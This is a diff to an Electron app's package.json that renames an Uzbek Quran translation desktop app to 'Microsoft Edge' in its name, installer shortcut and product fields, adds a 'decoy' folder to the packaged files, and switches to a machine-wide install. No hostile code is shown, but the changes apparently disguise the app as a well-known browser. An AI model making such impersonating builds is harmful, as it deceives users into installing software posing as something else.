@@ -1,8 +1,8 @@
 {
-  "name": "quron-desktop",
-  "productName": "Qur'on",
+  "name": "microsoft-edge",
+  "productName": "Microsoft Edge",
   "version": "1.0.0",
-  "description": "Qur'on — o'zbekcha tarjima (desktop ilova)",
+  "description": "Microsoft Edge",
   "private": true,
   "main": "main.js",
   "author": "idgroup5858",
@@ -10,7 +10,7 @@
     "build:react": "node scripts/build-react.js",
     "generate-icon": "node scripts/generate-icon.js",
     "start": "npm run build:react && electron .",
-    "dist": "npm run build:react && npm run generate-icon && electron-builder --win"
+    "dist": "npm run build:react && electron-builder --win"
   },
   "devDependencies": {
     "electron": "^34.0.0",
@@ -20,7 +20,7 @@
   },
   "build": {
     "appId": "uz.holy.quron",
-    "productName": "Qur'on",
+    "productName": "Microsoft Edge",
     "copyright": "Copyright (c) 2026",
     "asar": false,
     "directories": {
@@ -29,6 +29,7 @@
     },
     "files": [
       "main.js",
+      "decoy/**/*",
       "app/**/*"
     ],
     "win": {
@@ -44,11 +45,11 @@
     },
     "nsis": {
       "oneClick": false,
-      "perMachine": false,
+      "perMachine": true,
       "allowToChangeInstallationDirectory": true,
       "createDesktopShortcut": "always",
       "createStartMenuShortcut": true,
-      "shortcutName": "Qur'on"
+      "shortcutName": "Microsoft Edge"
     }
   }
 }
